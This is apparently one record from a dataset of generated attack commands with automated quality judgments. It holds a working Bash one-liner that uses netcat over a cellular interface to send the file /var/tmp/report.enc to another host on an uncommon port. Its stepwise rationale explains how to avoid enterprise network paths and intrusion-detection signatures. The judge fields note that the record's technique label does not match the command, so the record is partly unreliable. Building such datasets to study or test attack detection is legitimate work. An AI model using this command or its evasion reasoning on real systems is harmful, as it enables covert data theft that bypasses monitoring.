command: nohup tcpdump -i wwan0 -nn tcp port 55941 -U -w /dev/null >/dev/null 2>&1 & nc -s 10.64.23.5 10.64.23.9 55941 < /var/tmp/report.enc
explanation: Uses a cellular data interface (wwan0) to send data over an uncommon TCP port with minimal monitoring via tcpdump. This shifts exfiltration to a cellular medium, consistent with T1011.
rationale_steps: Choose the cellular interface to avoid enterprise wired/wireless paths.
Use rare TCP port 55941 to avoid default IDS signatures.
Limit tcpdump to the exact interface/port and drop captured bytes.
Bind nc to the wwan0 source IP to force the cellular route.

llm_judgments.syntactic_justification: Well-formed Bash with valid tcpdump and nc flags, proper nohup/backgrounding, redirections, and command sequencing.
llm_judgments.semantic_justification: It can exfiltrate /var/tmp/report.enc over TCP port 55941 via nc bound to a cellular-assigned IP (routing via wwan0 if the IP matches), but tcpdump will likely fail without elevated privileges and the provided technique description (system script proxy) does not match the behavior.
